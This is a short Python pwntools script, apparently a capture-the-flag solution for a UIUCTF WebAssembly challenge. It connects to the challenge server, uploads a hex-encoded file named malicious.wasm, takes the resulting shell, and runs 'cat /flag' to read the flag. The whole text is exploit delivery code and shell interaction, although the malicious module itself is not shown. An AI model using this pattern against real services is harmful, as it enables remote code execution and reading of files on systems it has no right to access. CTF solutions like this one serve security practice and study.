#!/usr/bin/env python3

from pwn import *

r = remote('wasm1.chal.uiuc.tf', 1337)

# read malicious.wasm binary file to hex
with open('malicious.wasm', 'rb') as f:
    payload = f.read().hex().encode()

# send wasm file
r.sendlineafter(b':\n', payload)
# provide input (doesn't matter)
r.sendlineafter(b': ', b'0')

# we got a shell!
r.sendline(b'cat /flag')
print(r.recvuntil(b'uiuctf{') + r.recvuntil(b'}'))
